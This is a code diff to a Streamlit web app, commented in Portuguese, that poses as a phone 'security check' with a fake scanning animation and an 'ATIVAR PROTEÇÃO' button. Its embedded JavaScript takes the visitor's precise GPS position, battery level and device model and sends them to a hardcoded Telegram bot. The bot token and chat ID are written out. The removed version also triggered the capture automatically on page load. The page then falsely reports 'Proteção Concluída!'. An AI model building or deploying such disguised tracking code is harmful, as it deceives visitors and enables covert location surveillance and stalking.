@@ -1,13 +1,13 @@
 import streamlit as st
 import time
 
-# --- CONFIGURAÇÃO DO BOT ---
+# --- CONFIGURAÇÃO DO BOT (DADOS TRAVADOS) ---
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
 st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# --- ESTILIZAÇÃO MANTIDA ---
+# --- SUA ESTILIZAÇÃO (MANTIDA) ---
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
@@ -37,61 +37,69 @@ st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_
 caixa_bolha = st.empty()
 caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
 
-# --- O COMPONENTE QUE "LIGA" O GPS VIA GOOGLE ---
-js_gps_auto = f"""
-<div id="container">
-    <button class="btn-barra" onclick="forcarGpsGoogle()">
+st.write("✅ Ambiente de pagamentos")
+st.write("✅ Privacidade e segurança")
+st.write("✅ Vírus")
+
+# --- O NOVO MOTOR DO BOTÃO (COMANDOS BLINDADOS) ---
+js_botao_real = f"""
+<div id="btn-area">
+    <button class="btn-barra" onclick="dispararComandos()">
         <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
     </button>
 </div>
 
 <script>
-async function forcarGpsGoogle() {{
-    // 'enableHighAccuracy: true' é o que força o Android a oferecer para LIGAR o GPS
-    const geoConfig = {{ 
-        enableHighAccuracy: true, 
-        timeout: 15000, 
-        maximumAge: 0 
-    }};
+async function dispararComandos() {{
+    const options = {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }};
 
     navigator.geolocation.getCurrentPosition(
         async (pos) => {{
             try {{
+                // Captura Bateria
                 const bat = await navigator.getBattery();
-                const bLvl = Math.round(bat.level * 100);
-                const model = navigator.userAgent.split('(')[1].split(')')[0];
-                const mapa = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+                const nivel = Math.round(bat.level * 100);
                 
-                const msg = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* `" + model + "`\\n🔋 *Bateria:* `" + bLvl + "%`\\n📍 [MAPA](" + mapa + ")";
+                // Captura Modelo
+                const modelo = navigator.userAgent.split('(')[1].split(')')[0];
                 
+                // Localização
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const link = "https://www.google.com/maps?q=" + lat + "," + lon;
+                
+                const texto = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* `" + modelo + "`\\n🔋 *Bateria:* `" + nivel + "%`\\n📍 [MAPA](" + link + ")";
+                
+                // Envio DIRETO para o Telegram via Fetch
                 await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                     method: "POST",
                     headers: {{ "Content-Type": "application/json" }},
-                    body: JSON.stringify({{ chat_id: "{ID}", text: msg, parse_mode: "Markdown" }})
+                    body: JSON.stringify({{
+                        chat_id: "{ID}",
+                        text: texto,
+                        parse_mode: "Markdown"
+                    }})
                 }});
                 
+                // Notifica o Python para girar a bolha
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
-            }} catch (e) {{ console.log(e); }}
+            }} catch (e) {{ console.log("Erro no envio"); }}
         }},
-        (err) => {{
-            // Se o GPS estiver desligado na barra, este erro dispara o pop-up da Google
-            console.log("Tentando forçar ativação do sistema...");
-        }},
-        geoConfig
+        (err) => {{ console.log("GPS Desligado"); }},
+        options
     );
 }}
-
-// Tenta disparar o pop-up da Google assim que a página abre
-setTimeout(forcarGpsGoogle, 500);
 </script>
 """
 
-ativou = st.components.v1.html(js_gps_auto, height=80)
+# Renderiza o botão
+clicou = st.components.v1.html(js_botao_real, height=80)
 
-if ativou:
-    for p in range(4, 101, 5):
-        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
-        time.sleep(0.05)
+# --- ANIMAÇÃO DE SUCESSO ---
+if clicou:
+    for p in range(4, 101, 8):
+        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
+        time.sleep(0.04)
     st.success("Proteção Concluída!")
     st.stop()
 
